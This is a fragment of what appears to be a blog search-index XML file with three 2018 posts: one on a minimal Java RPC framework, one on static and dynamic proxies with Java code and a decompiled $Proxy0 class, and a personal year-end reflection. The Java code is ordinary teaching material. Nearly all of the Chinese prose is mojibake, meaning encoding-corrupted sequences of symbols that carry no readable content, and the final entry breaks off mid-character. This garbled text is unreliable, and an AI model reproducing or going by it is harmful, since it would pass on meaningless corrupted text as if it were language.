      <link href="/2018/12/30/%E8%AF%BB%E6%A2%81%E9%A3%9E-RPC%E6%A1%86%E6%9E%B6%E5%87%A0%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%B0%B1%E5%A4%9F%E4%BA%86%20%20%20%E6%9C%89%E6%84%9F/"/>
      <url>/2018/12/30/%E8%AF%BB%E6%A2%81%E9%A3%9E-RPC%E6%A1%86%E6%9E%B6%E5%87%A0%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%B0%B1%E5%A4%9F%E4%BA%86%20%20%20%E6%9C%89%E6%84%9F/</url>
      
        <content type="html"><![CDATA[<p><em>Ê¢ÅÈ£û-dubboÊ°ÜÊû∂ÁöÑËÆæËÆ°ËÄÖÔºåÊòØ‰∏Ä‰ΩçÈòøÈáåÁöÑËµÑÊ∑±Êû∂ÊûÑÂ∏à</em></p><p>RPCÊ°ÜÊû∂Âá†Ë°å‰ª£Á†ÅÂ∞±Â§ü‰∫ÜÔºåËøôÁØáÊñáÁ´†ÂçÅÂàÜÈÄÇÂêà‰∏çÊòØÂæà‰∫ÜËß£RPCÁöÑ‰∫∫Áúã‰∏ÄÈÅçÔºåÊúÄÂ•ΩÊòØËá™Â∑±Êï≤‰∏ÄÈÅç„ÄÇÊ≥®ÈáäÔºåÂØπÂÖ•ÂèÇÁöÑÂ§ÑÁêÜÔºåÂØπÊµÅÁî®ÂêéËøõË°åÂÖ≥Èó≠ÔºåÂä®ÊÄÅ‰ª£ÁêÜÁöÑ‰ΩøÁî®„ÄÇ<br>ËøôËæπÊñáÁ´†Âú∞ÂùÄÔºö<br><a href="https://javatar.iteye.com/blog/1123915" target="_blank" rel="noopener"> https://javatar.iteye.com/blog/1123915</a></p><p>È¶ñÂÖàÂ∞Ü‰∏Ä‰∏ãÔºå‰∏∫‰ªÄ‰πàÁî®RPC( <strong>Remote Procedure Call</strong> )ËøúÁ®ãÂ∑•Á®ãË∞ÉÁî®„ÄÇ<br>‰ªÄ‰πàÊÉÖÂÜµ‰∏ã‰ºöÁî®Âà∞Ôºå‰∏Ä‰∏™ÂÖ¨Âè∏ÁöÑÈ°πÁõÆÂèØËÉΩÂ§ßÂèØËÉΩÂ∞èÔºåÂ∞èÁöÑÈ°πÁõÆÔºåÂèØËÉΩ‰∏Ä‰∏™È°πÁõÆÔºåËÄåÊúâ‰∫õÈ°πÁõÆÔºåÂèØËÉΩÂÖâ‰ª£Á†ÅÂíåjarÂ∞±ËÉΩÊúâ1GÂ§ßÂ∞èÔºåËøôÊó∂ÂÄôÂ∞±‰ºöËÆæËÆ°Âà∞ÂàÜÂ∏ÉÂºèÔºå‰ºöÂ∞ÜÂéüÊú¨ÁöÑÈ°πÁõÆËøõË°åÊãÜÂàÜÔºåÊãÜÂàÜÊàêÂ§ö‰∏™Â∞èÈ°πÁõÆÔºåËÆ©‰∏çÂêåÁöÑÂõ¢ÈòüÂéªË¥üË¥£‰∏çÂêåÁöÑÊ®°Âùó„ÄÇÈ°πÁõÆ‰∏≠Â¶ÇÊûúÁî®Âà∞Âà´ÁöÑÈ°πÁõÆÁöÑÊé•Âè£ÔºåËøô‰∏™Êó∂ÂÄôÂ∞±Áî®Âà∞‰∫ÜRPC„ÄÇ<br>ÂΩìÁÑ∂ÔºåËøôÊòØÊãÜÂàÜÈ°πÁõÆÔºå‰πüÂèØ‰ª•Âú®ÂàõÂª∫È°πÁõÆÁöÑÊó∂ÂÄôÔºåÂ∞±ÊòØÂàÜÂ∏ÉÂºèÁöÑ„ÄÇ</p><p>*<em>ÈÇ£‰πàÊàë‰ª¨Â∞±ÂÖ∑‰ΩìË∞àË∞à <em>ËøôÁØáÂçöÊñá‰∏≠ÁöÑÂ¶Ç‰ΩïÂÆûÁé∞ÁöÑRPC</em> *</em> Ôºö</p><p>È¶ñÂÖàÊúâ‰∏§‰∏™È°πÁõÆÔºà‰∏æ‰æãÔºâÔºåÂàÜÂà´‰∏∫ÔºöÁîü‰∫ßËÄÖÔºåÊ∂àË¥πËÄÖ„ÄÇ<br>Áîü‰∫ßËÄÖÔºö‰∏ÄÁõ¥ÂêØÂä®ÊúçÂä°Ôºå‰∏∫Ê∂àË¥πËÄÖÊèê‰æõÊúçÂä°ÔºåÂπ∂Êö¥Èú≤ÊúçÂä°<br>Ê∂àË¥πËÄÖÔºöÂêØÂä®Â∫îÁî®ÔºåÈÄöËøáhostÔºåportÔºåservice.class‰∏â‰∏™ÂèÇÊï∞ÂéªÁ°ÆÂÆöÂÖ∑‰ΩìË∞ÉÁî®ÁöÑÊòØÈÇ£‰∏™Êé•Âè£<br>hostÔºåportÊòØ‰∏∫‰∫ÜÈîÅÂÆöÁîü‰∫ßËÄÖÊòØÂì™Âè∞Êú∫Âô®ÈÇ£‰∏™Á´ØÂè£Ôºåservcice.class‰∏∫‰∫ÜÈîÅÂÆöË∞ÉÁî®Êé•Âè£ÁöÑclass„ÄÇ</p><p>Ê∂àË¥πËÄÖÂíåÁîü‰∫ßËÄÖ‰πãÈó¥ÊòØ‰ΩøÁî®java‰∏≠Ëá™Â∏¶ÁöÑsocketËøõË°åÈÄö‰ø°ÁöÑ„ÄÇ<br>Ê∂àË¥πËÄÖÔºö</p><pre><code>HelloService service = RpcFramework.refer(HelloService.class, &quot;127.0.0.1&quot;, 1234);  </code></pre><p>ËøôÈáåÈù¢ÂÖ∑‰ΩìÁî®Âà∞‰∫ÜÊòØÊàë‰∏ä‰∏ÄÁØáÂçöÂÆ¢‰∏≠ÊèêÂà∞ÁöÑÂä®ÊÄÅ‰ª£ÁêÜÊäÄÊúØÔºåÂú®ËøêË°å‰∏≠Âä®ÊÄÅÁîüÊàêÁöÑÔºåËÄåËøôËæπËøô‰∏™Âä®ÊÄÅ‰ª£ÁêÜÈáåÈù¢Ôºå‰ºöÁî®Âà∞socketËøõË°åËøúÁ®ãÈÄö‰ø°ÔºåÂ∞ÜË∞ÉÁî®ÁöÑÊé•Âè£ÔºåÊñπÊ≥ïÔºåÂèÇÊï∞ÔºåÈÄöËøásocketÂÜôËøáÂéªÔºåÁÑ∂ÂêéÁî®‰∏Ä‰∏™ObjectInputStreamÔºàÈòªÂ°ûÂºèÁöÑÔºâÊù•Êé•Êî∂‰ªéÁîü‰∫ßËÄÖËøîÂõûÁöÑÊï∞ÊçÆ</p><p>Áîü‰∫ßËÄÖÔºö<br>ÂÖàÊèê‰æõ‰∏Ä‰∏™socketServerÂπ∂Á°ÆÂÆöÁ´ØÂè£ÔºåÂèØ‰ª•Êé•Êî∂socket‰º†ËøáÊù•ÁöÑÊï∞ÊçÆ„ÄÇ<br>ËøôÊòØ‰∏Ä‰∏™while<br>trueÁöÑÊñπÂºè„ÄÇÂõ†‰∏∫ÊòØÂèØ‰ª•‰∏çÊñ≠Âæ™ÁéØÔºåÊü•ÁúãÊòØÂê¶Êúâ‰∫∫ËøûÊé•ÁöÑËøô‰∏™socketServerÊúçÂä°Âô®ÔºåÂ¶ÇÊûúÊé•Êî∂ÁöÑÊï∞ÊçÆÔºåÂ∞±ÂºÄ‰∏Ä‰∏™Á∫øÁ®ãÊù•Êé•Êî∂Êï∞ÊçÆÔºåÂπ∂ËøîÂõûÊï∞ÊçÆ„ÄÇËøôÈáåÈù¢‰∏çÊòØÁúüÊ≠£ÁöÑË∞ÉÁî®ÔºåËÄåÊòØÈÄöËøáÂèçÂ∞ÑÁöÑÊñπÂºèÔºåÁõ¥Êé•method.invoke()ÁöÑÊñπÂºèËé∑ÂæóËøô‰∏™ÊñπÊ≥ïÁöÑËøîÂõûÂÄºÔºåÂπ∂Â∞ÜËøîÂõûÂÄºÈÄöËøásocketÂÜôÂõûÂéªÔºåËøîÂõûÁªôÊ∂àË¥πËÄÖ„ÄÇ„ÄÇ<br><em>ËøôËæπÁöÑÂºÄÁ∫øÁ®ãÁöÑÂ•ΩÂ§ÑÔºåÊõ¥Â§öÁöÑÊòØËÆ©Á®ãÂ∫èÂèØ‰ª•Âπ∂Ë°åÁöÑÂ§ÑÁêÜÊï∞ÊçÆÔºåËÄå‰∏çÊòØÂ§ÑÁêÜ‰∫Ü‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂú®Â§ÑÁêÜ‰∏≠ÔºåÁ¨¨‰∫å‰∏™ÊñπÊ≥ïÊù•‰∫ÜÔºåËÄåÊó†Ê≥ïÂØπÂÖ∂ËøõË°åÊúçÂä°ÔºåÂ¢ûÂä†ÊúçÂä°ËÉΩÂäõ„ÄÇ</em></p><p>ÂΩìÁÑ∂ÔºåËøôÁØáÂçöÊñáÈáåÈù¢Êõ¥Â§öÁöÑÊòØ‰∏ÄÁßçÁ§∫ËåÉÔºåËøôËæπËøûÊé•ÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•‰ΩøÁî®nettyÔºåÂΩìÁÑ∂Âè™ÊòØÈÅìÂê¨ÈÄîËØ¥</p><p>ÂàöÂàöÂéªÁúã‰∫ÜdubboÂú®githubÈáåÈù¢ÁöÑissueÔºå <a href="https://github.com/apache/incubator-dubbo/issues/3088" target="_blank" rel="noopener"> https://github.com/apache/incubator-<br>dubbo/issues/3088 </a><br>ÊàëÂØπÈáåÈù¢ÁöÑÈóÆÈ¢òËøõË°å‰∫ÜÊà™Âõæ<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373868.56944544989.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"></p><p>ÈÉΩÊòØÂõΩ‰∫∫ÂêßÔºå‰ΩÜÊòØ‰∏ÄËà¨ÈÉΩ‰ºö‰ΩøÁî®Ëã±Êñá‰∫§ÊµÅÔºåËøôÂ∞±ÊòØ‰∏ÄÁßçÊ∞õÂõ¥ÂêßÔºåËÄå‰∏î‰∏Ä‰∏™ÂÖ¨Âè∏Êï¢‰∫éÂ∞ÜËá™Â∑±ÁöÑ‰∫ßÂìÅÂºÄÊ∫êÂá∫ÂéªÔºåÂ∞±ÊòØ‰∏ÄÁßçÊÄÅÂ∫¶„ÄÇÊàëËøòËÆ∞ÂæóËøôÈáåÈù¢Â∞±Êúâ‰∏Ä‰∫õÂêåÊ†∑ÊòØ‰∫íËÅîÁΩëÂÖ¨Âè∏</p>]]></content>
      
      
      
        <tags>
            
            <tag> rpc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Èù¢ËØï‰πã‰ª£ÁêÜ</title>
      <link href="/2018/12/23/%E9%9D%A2%E8%AF%95%E4%B9%8B%E4%BB%A3%E7%90%86/"/>
      <url>/2018/12/23/%E9%9D%A2%E8%AF%95%E4%B9%8B%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><em>Êò®Â§©Èù¢ËØïÁ¢∞Âà∞‰∫ÜÈù¢ËØïÂÆòÈóÆspringÁöÑÊó∂ÂÄôÔºåÈóÆÂÆåiocÔºåÁÑ∂Âêé‰∏ã‰∏™ÈóÆÈ¢òÊàë‰ª•‰∏∫ÊòØaopÔºåÂêéÊù•ÊâçÂê¨Ê∏ÖÊòØÂä®ÊÄÅ‰ª£ÁêÜÔºåÊÑüËßâÂõûÁ≠îÁöÑ‰∏çÊòØÂ§™Â•ΩÔºå‰πüÊòØÂ•Ω‰πÖ‰∏çÊé•Ëß¶</em></p><p><strong>1.ÈùôÊÄÅ‰ª£ÁêÜ</strong><br>‰ª£ÁêÜÊ®°Âºè‰πüÂ∞±ÂßîÊâòÊ®°Âºè„ÄÇ<br>‰∏â‰∏™ËßíËâ≤Ôºö</p><ol><li>SubjectÊäΩË±°‰∏ªÈ¢òËßíËâ≤ÔºöÊé•Âè£ </li><li>RealSubjectÂÖ∑‰Ωì‰∏ªÈ¢òËßíËâ≤ÔºöÊé•Âè£ÁöÑÂÆûÁé∞Á±ªÔºå‰∏öÂä°ÈÄªËæëÁöÑÂÖ∑‰ΩìÊâßË°åËÄÖ </li><li>Proxy‰ª£ÁêÜ‰∏ªÈ¢òËßíËâ≤Ôºö‰πüÂè´ÂÅöÂßîÊâòÁ±ªÔºå‰ª£ÁêÜÁ±ª„ÄÇÂÆÉË¥üË¥£ÂØπÁúüÂÆûËßíËâ≤ÁöÑÂ∫îÁî®ÔºåË¥üË¥£ÁúüÂÆûËßíËâ≤ÂâçÂêéÂâçÂêéÂÅöÈ¢ÑÂ§ÑÁêÜÂíåÂñÑÂêéÂ§ÑÁêÜ„ÄÇ </li></ol><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373869.44128871777.png" alt="‰ª£ÁêÜÊ®°ÂºèÁöÑÈÄöÁî®Á±ªÂõæ"></p><p>Âú®ËøôÈáåÈù¢SubjectÊòØ‰∏Ä‰∏™ÂÄüÂè£ÔºåÈáåÈù¢Êúâ‰∏Ä‰∏™RequestÔºàÔºâÊñπÊ≥ïÔºåRealSubjectÁ±ªÂÆûÁé∞‰∫ÜSubjectËøô‰∏™Êé•Âè£ÔºåÂπ∂‰∏îÂÆûÁé∞‰∫ÜrequestÔºàÔºâÊñπÊ≥ïÔºåËÄåÂú®Proxy‰πüÂÆûÁé∞‰∫ÜSubjectÊé•Âè£ÔºåproxyÈáåÈù¢ËøòÊúâ‰∏Ä‰∏™ÂèòÈáèSubjectÔºåÂèØ‰ª•ÈÄöËøáÊûÑÈÄ†ÂáΩÊï∞Â∞ÜRealSubjectÊ≥®ÂÖ•ÔºåÂú®ÂÆûÁé∞requestÊñπÊ≥ïÊó∂ÔºåÂÖ∂ÂÆûÊòØË∞ÉÁî®ÁöÑÊòØRealsubjectÈáåÈù¢ÁöÑrequestÊñπÊ≥ïÔºåÂú®Ë∞ÉÁî®requestÔºàÔºâÊñπÊ≥ïÂâçÂêéÂèØ‰ª•Ë∞ÉÁî®‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÊñπÊ≥ï„ÄÇ<br>‰∏ãÈù¢ÊòØÂÖ∑‰ΩìÁöÑ‰ª£Á†Å</p><p>Subject.java</p><pre><code>public interface Subject {    //ÂÆö‰πâ‰∏Ä‰∏™ÊñπÊ≥ï    public void request();}</code></pre><p>RealSubject.java</p><pre><code>public class RealSubject implements Subject {    @Override    public void request() {        //‰∏öÂä°ÈÄªËæëÂ§ÑÁêÜ    }}</code></pre><p>Proxy.java</p><pre><code>public class Proxy implements Subject {    private Subject subject = null;    public Proxy(Subject subject){        this.subject = subject;    }    @Override    public void request() {        before();        subject.request();        after();    }    public void before(){        //do something    }    public void after(){        //do something    }}</code></pre><p>‰ª£ÁêÜÊ®°ÂºèÁöÑ‰ΩøÁî®Âú∫ÊôØ<br><em>‰∏∫‰ªÄ‰πàË¶Å‰ΩøÁî®‰ª£ÁêÜÂë¢ÔºüÊÉ≥ÊÉ≥Áé∞ÂÆû‰∏ñÁïåÂêßÔºåÊâìÂÆòÂè∏‰∏∫‰ªÄ‰πàË¶ÅÊâæ‰∏™ÂæãÂ∏àÔºüÂõ†‰∏∫‰Ω†‰∏çÊÉ≥ÂèÇ‰∏é‰∏≠Èó¥ËøáÁ®ãÁöÑÊòØÊòØÈùûÈùûÔºåÂè™Ë¶ÅÂÆåÊàêËá™Â∑±ÁöÑÁ≠îËæ©Â∞±Ë°å‰∫ÜÔºåÂÖ∂‰ªñÁöÑÊØîÂ¶Ç‰∫ãÂâçË∞ÉÊü•„ÄÅ‰∫ãÂêéË∞ÉÊü•ÈÉΩÁî±ÂæãÂ∏àÊêûÂÆöÔºåËøôÂ∞±ÊòØ‰∏∫‰∫ÜÂáèËΩª‰Ω†ÁöÑË¥üÊãÖ„ÄÇ‰ª£ÁêÜÊ®°ÂºèÁöÑ‰ΩøÁî®Âú∫ÊôØÈùûÂ∏∏Â§öÔºåÂèØ‰ª•ÁúãËßÅSpring<br>aopÔºåËøôÊòØÈùûÂ∏∏ÂÖ∏ÂûãÁöÑÂä®ÊÄÅ‰ª£ÁêÜ</em></p><p><strong>‰∫åÔºöÂä®ÊÄÅ‰ª£ÁêÜ</strong><br><em>Âä®ÊÄÅ‰ª£ÁêÜÊòØÂú®ÂÆûÁé∞Èò∂ÊÆµ‰∏çÁî®ÂÖ≥ÂøÉ‰ª£ÁêÜË∞ÅÔºåËÄåÂú®ËøêË°åÈò∂ÊÆµÊâçÊåáÂÆö‰ª£ÁêÜÂì™‰∏Ä‰∏™ÂØπË±°„ÄÇÁõ∏ÂØπÊù•ËØ¥ÔºåËá™Â∑±ÂÜô‰ª£ÁêÜÁ±ªÁöÑÊñπÂºèÂ∞±Âè´ÈùôÊÄÅ‰ª£ÁêÜ</em><br><strong>ÂàíÈáçÁÇπÔºåÂú®ËøêË°åÈò∂ÊÆµÊåáÂÆöÂì™‰∏Ä‰∏™ÂØπË±°</strong><br>ÂÖ∑‰Ωì‰ª£Á†ÅÔºåÈÄªËæëÂæÖ‰ºöÂÜçËØ¥</p><p>ÊäΩË±°‰∏ªÈ¢ò</p><pre><code>public interface Subject {    /**     * //‰∏öÂä°Êìç‰Ωú     * @param str     */    void doSomething(String str);    /**     * ÂêÉ     * */    void eat(String str);}</code></pre><p>ÁúüÂÆû‰∏ªÈ¢ò</p><pre><code>public class RealSubject implements Subject {    @Override    public void doSomething(String str) {        System.out.println(&quot;do something!----&gt;&quot; + str);    }    @Override    public void eat(String str) {        System.out.println(&quot;‰ªäÂ§©Êôö‰∏äÂêÉ&quot;+str);    }}</code></pre><p>Âä®ÊÄÅ‰ª£ÁêÜÁöÑhandlerÁ±ª</p><pre><code>public class MyInvocationHandler implements InvocationHandler {    /**     * Ë¢´‰ª£ÁêÜÁöÑÂØπË±°     */    private Object target;    public MyInvocationHandler(Object target){        this.target = target;    }    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {        //log Before        System.out.println(&quot;log before:&quot;+&quot;method: &quot;+method.getName()+ &quot;return :&quot;+method.getReturnType().getSimpleName());        Object result = method.invoke(target,args);        System.out.println(&quot;log after: &quot;+new Date(System.currentTimeMillis()));        return result;    }}</code></pre><p>Âä®ÊÄÅ‰ª£ÁêÜÁ±ª</p><pre><code>public class DynamicProxy&lt;T&gt; {    public static &lt;T&gt; T newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler handler){        //ËøîÂõûÁõÆÊ†áÔºåÂπ∂ËøîÂõûÁªìÊûú        return (T) Proxy.newProxyInstance(loader,interfaces,handler);    }}</code></pre><p>Âä®ÊÄÅ‰ª£ÁêÜÁöÑÂú∫ÊôØÁ±ª</p><pre><code>public class Client {    public static void main(String[] args) throws IOException {        //ÂÆö‰πâ‰∏Ä‰∏™‰ª£ÁêÜÁ±ª        Subject subject = new RealSubject();        //ÂÆö‰πâ‰∏Ä‰∏™Handler        InvocationHandler handler = new MyInvocationHandler(subject);        //ÂÆö‰πâ‰∏ªÈ¢òÁöÑ‰ª£ÁêÜ        Subject proxy = DynamicProxy.newProxyInstance(subject.getClass().getClassLoader(),subject.getClass().getInterfaces(),handler);        //‰ª£ÁêÜÁöÑË°å‰∏∫        System.out.println(proxy.getClass().getCanonicalName());        proxy.doSomething(&quot;finish&quot;);        proxy.eat(&quot;È¶ôÈîÖÈáåËæ£ÂÆ∂ÁöÑÈ∫ªËæ£È¶ôÈîÖ&quot;);        //Ê≠§Â§ÑÂèØ‰ª•Â∞Ü        byte[] proxyClass = ProxyGenerator.generateProxyClass(proxy.getClass()                .getSimpleName(), proxy.getClass().getInterfaces());        //Â∞ÜÂ≠óËäÇÁ†ÅÊñá‰ª∂‰øùÂ≠òÂà∞DÁõòÔºåÊñá‰ª∂Âêç‰∏∫$Proxy0.class        FileOutputStream outputStream = new FileOutputStream(new File(                &quot;d:\\$Proxy0.class&quot;));        outputStream.write(proxyClass);        outputStream.flush();        outputStream.close();    }}</code></pre><p>ÂàÜÊûêËøáÁ®ãÔºö</p><pre><code>Subject proxy = DynamicProxy.newProxyInstance(subject.getClass().getClassLoader(),subject.getClass().getInterfaces(),handler);</code></pre><p>_Âú®Êàë‰ª¨‰ΩøÁî®proxy.doSomthing(args);<br>proxy.eat(args); _<br>_<strong>Êàë‰ª¨ÂèØ‰ª•ÊÉ≥Ë±°Âá∫ÔºåDynamicProxy.newProxyInstanceÔºàargsÔºâËøô‰∏™ÊñπÊ≥ïËøîÂõû‰∫Ü‰∏Ä‰∏™proxyÂØπË±°</strong> _<br>Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÊòØË∞ÉÁî®‰∫ÜËøô‰∏™ÊñπÊ≥ï<br>*<em>newProxyInstance(ClassLoader loader,<br>Class&lt;?&gt;[] interfaces,<br>InvocationHandler h) *</em></p><pre><code>@CallerSensitive    public static Object newProxyInstance(ClassLoader loader,                                          Class&lt;?&gt;[] interfaces,                                          InvocationHandler h)        throws IllegalArgumentException    {        Objects.requireNonNull(h);        final Class&lt;?&gt;[] intfs = interfaces.clone();        final SecurityManager sm = System.getSecurityManager();        if (sm != null) {            checkProxyAccess(Reflection.getCallerClass(), loader, intfs);        }        /*         * Look up or generate the designated proxy class.         */         // Ê≠§Â§ÑÂ∞±ËÆ≤classÁîüÊàêÂ•Ω‰∫Ü        Class&lt;?&gt; cl = getProxyClass0(loader, intfs);        /*         * Invoke its constructor with the designated invocation handler.         */        try {            if (sm != null) {                checkNewProxyPermission(Reflection.getCallerClass(), cl);            }            final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);            final InvocationHandler ih = h;            if (!Modifier.isPublic(cl.getModifiers())) {                AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() {                    public Void run() {                        cons.setAccessible(true);                        return null;                    }                });            }            // ÈÄöËøáÊûÑÈÄ†ÂèÇÊï∞ÈáçÊñ∞ÂàõÂª∫ÂÆû‰æã            return cons.newInstance(new Object[]{h});        } catch (IllegalAccessException|InstantiationException e) {            throw new InternalError(e.toString(), e);        } catch (InvocationTargetException e) {            Throwable t = e.getCause();            if (t instanceof RuntimeException) {                throw (RuntimeException) t;            } else {                throw new InternalError(t.toString(), t);            }        } catch (NoSuchMethodException e) {            throw new InternalError(e.toString(), e);        }    }</code></pre><p>ÊúÄÂêéËøô‰∏™ÊñπÊ≥ï‰ºöÂú®ËøêË°å‰∏≠ÁîüÊàê‰∏Ä‰∏™<br>Á±ªÔºåÂêçÂ≠óÂè´Ôºöcom.sun.proxy.$Proxy0<br>ËÄåÊàë‰ª¨Âπ∂Ê≤°ÊúâÊâæÂà∞Ëøô‰∏™Á±ªÔºåÂèØ‰ª•ÈÄöËøáÊàë‰ª¨‰∏äÈù¢ÁöÑClientÈáåÈù¢ÁöÑÂ∞ÜËøô‰∏™ËøêË°å‰∏≠ÁîüÊàêÁöÑÁ±ªÊâìÂç∞Âá∫Êù•ÔºåÊàë‰ª¨Êù•ÁúãÁúãÔºåËøô‰∏™Á±ªÊòØ‰ªÄ‰πàÊ†∑Â≠êÁöÑ<br>$Proxy0.class,ÂèçÁºñËØë</p><pre><code>public final class $Proxy0 extends Proxy implements Subject {    private static Method m1;    private static Method m2;    private static Method m3;    private static Method m4;    private static Method m0;    public $Proxy0(InvocationHandler var1) throws  {        super(var1);    }    public final boolean equals(Object var1) throws  {        try {            return (Boolean)super.h.invoke(this, m1, new Object[]{var1});        } catch (RuntimeException | Error var3) {            throw var3;        } catch (Throwable var4) {            throw new UndeclaredThrowableException(var4);        }    }    public final String toString() throws  {        try {            return (String)super.h.invoke(this, m2, (Object[])null);        } catch (RuntimeException | Error var2) {            throw var2;        } catch (Throwable var3) {            throw new UndeclaredThrowableException(var3);        }    }    public final void doSomething(String var1) throws  {        try {            super.h.invoke(this, m3, new Object[]{var1});        } catch (RuntimeException | Error var3) {            throw var3;        } catch (Throwable var4) {            throw new UndeclaredThrowableException(var4);        }    }    public final void eat(String var1) throws  {        try {            super.h.invoke(this, m4, new Object[]{var1});        } catch (RuntimeException | Error var3) {            throw var3;        } catch (Throwable var4) {            throw new UndeclaredThrowableException(var4);        }    }    public final int hashCode() throws  {        try {            return (Integer)super.h.invoke(this, m0, (Object[])null);        } catch (RuntimeException | Error var2) {            throw var2;        } catch (Throwable var3) {            throw new UndeclaredThrowableException(var3);        }    }    static {        try {            m1 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;equals&quot;, Class.forName(&quot;java.lang.Object&quot;));            m2 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;toString&quot;);            m3 = Class.forName(&quot;com.husky.dynamicproxy.Subject&quot;).getMethod(&quot;doSomething&quot;, Class.forName(&quot;java.lang.String&quot;));            m4 = Class.forName(&quot;com.husky.dynamicproxy.Subject&quot;).getMethod(&quot;eat&quot;, Class.forName(&quot;java.lang.String&quot;));            m0 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;hashCode&quot;);        } catch (NoSuchMethodException var2) {            throw new NoSuchMethodError(var2.getMessage());        } catch (ClassNotFoundException var3) {            throw new NoClassDefFoundError(var3.getMessage());        }    }}</code></pre><p>È¶ñÂÖà$Proxy0Ëøô‰∏™Á±ªextends Proxy implements Subject<br>Êúâ‰∏Ä‰∏™ÈùôÊÄÅ‰ª£Á†ÅÂùóÔºå‰ºöÂèçÂ∞ÑÁîüÊàêMethodÁ±ªÔºå‰πüÂ∞±ÊòØÁªô $ProxyËøô‰∏™Á±ªÁöÑÂèòÈáèËµãÂÄº<br>‰∏æ‰æãÊàëÂú®Ë∞ÉÁî®proxy.doSomething()Ëøô‰∏™ÊñπÊ≥ïÊó∂<br>Êàë‰ª¨ÂÖ∂ÂÆûÊòØË∞ÉÁî®</p><pre><code>public final void doSomething(String var1) throws  {       try {           super.h.invoke(this, m3, new Object[]{var1});       } catch (RuntimeException | Error var3) {           throw var3;       } catch (Throwable var4) {           throw new UndeclaredThrowableException(var4);       }   }</code></pre><p>Ë∞ÉÁî®ÁöÑÊòØsuper.h.invoke(this, m3, new Object[]{var1});<br>Ëøô‰∏™h‰πüÂ∞±ÊòØÂÆûÁé∞InvocationHandlerÊé•Âè£ÁöÑMyInvocationHandlerÁ±ª„ÄÇÂ∞ÜËøô‰∏™$Proxy0Ôºåm3Ôºå new<br>Object[]{var1}Ëøô‰∫õÂèòÈáè‰º†ËøáÂéª</p><p>ÂçöÂÆ¢‰πü‰ºöÂèëÂ∏ÉÂú®ÂçöÂÆ¢Âõ≠ÔºåÂçöÂÆ¢Âõ≠ÁöÑÂçöÂÆ¢ÈÉΩ‰ºöÊòØÈùûÂ∏∏ËÆ§ÁúüÁöÑÔºåËÄå‰∏çÂÉècsdn‰∏ÄÊ†∑ÊùÇ‰π±<br>ÂÖ∑‰Ωì‰ª£Á†ÅÔºö<a href="https://github.com/pompeii666/proxy" target="_blank" rel="noopener">https://github.com/pompeii666/proxy</a></p><p>ËøôÁØáÂçöÂÆ¢ËÄóÊó∂Ôºå‰∏ÄÂë®ÔºåÊñ≠Êñ≠Áª≠Áª≠ÔºåÁôΩÂ§©Â∑•‰ΩúÂõûÊù•ÔºåÂêÉ‰∏™È•≠ÔºåÊ¥ó‰∏™Êæ°ÔºåÂ∞±ÊÉ≥Áù°Ëßâ„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Âπ¥ÂâçÁöÑÊÑüÊÉ≥</title>
      <link href="/2018/12/07/%E5%B9%B4%E5%89%8D%E7%9A%84%E6%84%9F%E6%83%B3/"/>
      <url>/2018/12/07/%E5%B9%B4%E5%89%8D%E7%9A%84%E6%84%9F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<p>‰ªäÂπ¥ÂíåÂæÄÂπ¥‰∏ç‰∏ÄÊ†∑ÔºåÁÆóÊòØ‰∫∫ÁîüÁöÑÂèòÂåñÂêß„ÄÇ<br>‰∏äÂçäÂπ¥3ÊúàÂà∞7Êúà‰∏ÄÁõ¥Âú®Êó†Èî°ÂÆûËÆ≠Ôºå‰πãÂêéÂ∞±ÊòØÁªèÂéÜÈù¢ËØïÂÖ¨Âè∏Ôºå<br>‰πüÁÆóÊòØÁ¨¨‰∏ÄÊ¨°‰ΩìÈ™åÂà∞Á§æ‰ºöÁöÑÊ†∑Â≠ê„ÄÇ<br>ÂêéÊù•Êù•Âà∞‰∫Ü‰∫ö‰ø°ÔºåÂÖ¨Âè∏ÊòØÁúüÁöÑÂ§ßÔºåÂú®ÊàëÁúãÊù•„ÄÇ<br>ÂàöÂà∞ËøôÔºåÂ∞±ÊÑüËßâÂà∞Â§ßÂÖ¨Âè∏ÁöÑÂÅö‰∫ãÔºåÊµãËØïÂºÄÂèëËøêÁª¥„ÄÇ<br>ËøõÁöÑÁªÑ‰πüÈùûÂ∏∏Â•ΩÔºåÊØèÂë®ÈÉΩÊúâÂ•∂Ëå∂ÂñùÔºåÊØèÂë®‰∫åÊôö‰∏äÊúâÁü•ËØÜÂüπËÆ≠Ôºå‰∏ÄËà¨ÊòØËΩÆÊç¢‰∫∫ÂéªËÆ≤„ÄÇ<br>Áé∞Âú®ÊÉ≥ÊÉ≥ÔºåÂ¶ÇÊûúËøô‰∏™ÁªÑÊòØÂú®Âà´ÁöÑÂÖ¨Âè∏Â∞±Â•Ω‰∫ÜÔºåËøôÊ†∑ÁöÑÊ∞õÂõ¥ÁúüÁöÑÂ•ΩÔºåÂâçÂá†Â§©Á¶ªËÅåÔºåÊ≠£Ëµ∂‰∏äËÅöÈ§êÔºåÈÇ£Â§©Âñù‰∫Ü‰∏ÄÊùØ„ÄÇ</p><p>Áé∞Âú®Â∞±Âú®ÊâæÂ∑•‰ΩúÔºåÊò®Â§©ÂéªÈù¢ËØï‰∫Ü‰∏ÄÂÆ∂ÔºåÂæàÂ∞è‰ΩÜÊòØÂ∑•ËµÑËøò‰∏çÈîôÔºåÂ∏åÊúõËÉΩËøá„ÄÇÊàëËßâÂæó‰∏Ä‰∏™‰∫∫Áö